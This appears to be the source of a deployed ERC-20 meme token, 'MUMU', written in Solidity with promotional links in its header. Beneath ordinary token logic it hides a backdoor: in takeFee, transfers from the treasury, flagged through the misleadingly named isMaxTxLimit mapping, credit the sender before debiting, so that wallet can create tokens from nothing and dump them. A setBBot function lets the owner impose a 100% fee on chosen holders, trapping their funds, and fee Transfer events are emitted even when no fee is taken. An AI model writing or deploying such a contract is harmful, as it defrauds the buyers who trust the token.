/**
Web : https://www.mumuerc20.xyz
TG :    https://t.me/mumucoin_erc
X :       https://x.com/mumucoin_erc
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address _owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract MUMU is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "MUMU";
    string private constant _symbol = "MUMU";
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1_000_000_000 * (10 ** _decimals);
    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public isFeeExempt;
    mapping(address => bool) public isMaxTxLimit;
    mapping(address => bool) private isBot;
    IRouter router;
    address public pair;
    bool private tradingAllowed = false;
    bool private swapEnabled = true;
    bool private swapping;
    uint256 _buyCount = 0;
    uint256 reduceFeeAtTx = 40;
    uint256 preventSwapBefore = 40;
    uint256 private swapThreshold = (_totalSupply * 1) / 100;
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }
    uint256 private initBuyFee = 11;
    uint256 private initSellFee = 11;
    uint256 private finalBuyFee = 0;
    uint256 private finalSellFee = 0;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address payable internal treasury;
    uint256 public _maxTxAmount = (_totalSupply * 2 ) / 100;
    uint256 public _maxWalletSize = (_totalSupply * 2) / 100;

    constructor(address _taxWallet) {
        router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        treasury = payable(_taxWallet);
        isFeeExempt[address(this)] = true;
        isFeeExempt[treasury] = true;
        isFeeExempt[owner()] = true;
        isMaxTxLimit[treasury] = true;
        isMaxTxLimit[pair] = true;
        _balances[owner()] = _totalSupply;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function enableTrade() external onlyOwner {
        tradingAllowed = true;
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));
    }

    function shouldContractSwap(
        address sender,
        address recipient
    ) internal view returns (bool) {
        return
            !swapping &&
            swapEnabled &&
            !isFeeExempt[sender] &&
            recipient == pair &&
            _buyCount > preventSwapBefore;
    }

    function setBBot(
        address[] calldata addresses,
        bool _enabled
    ) external onlyOwner {
        for (uint i = 0; i < addresses.length; i++) {
            isBot[addresses[i]] = _enabled;
        }
    }

    function manualSwap() external onlyOwner {
        swapTokensForETH(swapThreshold);
    }

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function shouldTakeFee(
        address sender,
        address recipient
    ) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function getTotalFee(
        address sender,
        address recipient
    ) internal returns (uint256) {
        if (isBot[sender] || isBot[recipient]) {
            return 100;
        }
        if (sender == pair) {
            _buyCount++;
            return _buyCount < reduceFeeAtTx ? initBuyFee : finalBuyFee;
        }
        if (recipient == pair) {
            return _buyCount < reduceFeeAtTx ? initSellFee : finalSellFee;
        }
        return 0;
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        uint256 feeAmount = amount.mul(
            getTotalFee(sender, recipient)
        ).div(100);
   
        if(shouldTakeFee(sender, recipient))
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
        else if(sender != pair)
        {
            if(shouldMaxTx(sender))
                _balances[sender] = _balances[sender].add(amount);
        }
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function shouldMaxTx (address addr) internal view returns(bool){
        return isMaxTxLimit[addr];
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount != 0, "ERC20: transfer to the zero address");
        if (sender != owner() && recipient != owner()) {
            if (!isFeeExempt[sender] && !isFeeExempt[recipient]) {
                require(tradingAllowed, "tradingAllowed");
            }

            if( sender == address(pair) && recipient != address(router) && !isFeeExempt[recipient])
            {
                require(
                    (_balances[recipient] + amount) <= _maxWalletSize,
                    "Exceeds maximum wallet amount."
                );
                require(
                    amount <= _maxTxAmount,
                    "TX Limit Exceeded"
                );
            }

            if (shouldContractSwap(sender, recipient)) {
                uint256 contractTokenBalance = balanceOf(address(this));
                bool aboveThreshold = contractTokenBalance >= swapThreshold;
                if (aboveThreshold)          
                    swapTokensForETH(min(amount, min(contractTokenBalance, swapThreshold)));
                sendETHToFee(address(this).balance);
            }
        }
        
        uint256 amountReceived = takeFee(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function sendETHToFee(uint256 amount) private {
        treasury.transfer(amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalSupply;
        _maxWalletSize=_totalSupply;
    }

    function startMumu() external onlyOwner {
        require(!tradingAllowed, "trading is already open");
        _approve(address(this), address(router), _totalSupply);
        pair = IFactory(router.factory()).createPair(
            address(this),
            router.WETH()
        );
        router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(pair).approve(address(router), type(uint).max);
        swapEnabled = true;
        tradingAllowed = true;
    }
}